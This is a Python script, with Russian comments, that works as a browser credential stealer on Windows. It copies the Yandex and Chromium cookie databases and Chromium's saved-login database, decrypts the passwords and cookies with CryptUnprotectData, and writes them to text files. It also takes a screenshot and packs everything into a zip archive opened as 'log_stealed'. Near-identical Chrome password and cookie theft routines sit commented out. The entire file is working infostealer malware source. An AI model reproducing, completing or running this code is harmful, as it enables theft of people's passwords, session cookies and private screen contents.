import os
import win32crypt
import shutil
import sqlite3
import zipfile

from PIL import ImageGrab


username = os.getlogin()


#def Chrome():
#    text = "\nPasswords Chrome: " + "\n"
#    text += 'URL | LOGIN | PASSWORD:' + '\n'  # Логи идут в таком формате.
#    if os.path.exists(
#            os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data'):  # Ищем файлы Login Data
#        shutil.copy2(os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data',
#                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
#        conndb = sqlite3.connect(os.getenv(
#            "LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data')  # Начинаем работать с sqlite базой
#        cursor = conndb.cursor()
#        cursor.execute(
#            'SELECT action_url, username_value, password_value FROM logins')  # Вытаскиваем Ссылку, логин, пароль
#        for results in cursor.fetchall():
#            password = win32crypt.CryptUnprotectData(results[2])[1].decode()  # Расшифровываем данные
#            login = results[1]
#            url = results[0]
#            if password != '':
#                text += url + ' | ' + login + ' | ' + password + '\n'  # Добавляем данный в переменную
#    return text
#
#
#file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")  # Сохраняем данные в txt файл google_pass
#file.write(str(Chrome()) + '\n')
#file.close()
#
#
#def Chrome_cockie():
#    textc = "\nCockies Chrome: " + "\n"
#    textc += 'URL | COOKIE | COOKIE NAME' + '\n'
#    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
#        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies',
#                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
#        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
#        cursor = conn.cursor()
#        cursor.execute("SELECT * from cookies")
#        for result in cursor.fetchall():
#            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
#            name = result[2]
#            url = result[1]
#            textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
#    return textc
#
#
#file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+")
#file.write(str(Chrome_cockie) + '\n')
#file.close()


def Yandex():
    texty = '\nYANDEX Cookies:' + '\n'
    texty += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies',
                     os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
            name = result[2]
            url = result[1]
            texty += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return texty


file = open(os.getenv("APPDATA") + '\\yandex_cookies.txt', "w+")  # данные
file.write(str(Yandex()) + '\n')
file.close()


def chromium():
    textch = '\nChromium Passwords:' + '\n'
    textch += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data',
                     os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                textch += url + ' | ' + login + ' | ' + password + '\n'
    return textch


file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")  # данные
file.write(str(chromium()) + '\n')
file.close()


def chromiumc():
    textchc = ""
    textchc += '\nChromium Cookies:' + '\n'
    textchc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies',
                     os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
        cursor = conn.cursor()
        cursor.execute("SELECT * from cookies")
        for result in cursor.fetchall():
            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
            name = result[2]
            url = result[1]
            textchc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
    return textchc


file = open(os.getenv("APPDATA") + '\\chromium_cookies.txt', "w+")  # данные
file.write(str(chromiumc()) + '\n')
file.close()


screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpeg')


zname = r'E:\LOG.zip'  # создаем переменную - название и местоположение файла
newzip = zipfile.ZipFile(zname, 'w')  # создаем архив
#newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_pass.txt')
#newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\yandex_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium_cookies.txt')
newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\sreenshot.jpeg')
newzip.close()  # закрываем архив

log_stealed = open("E:\LOG.zip", 'rb')
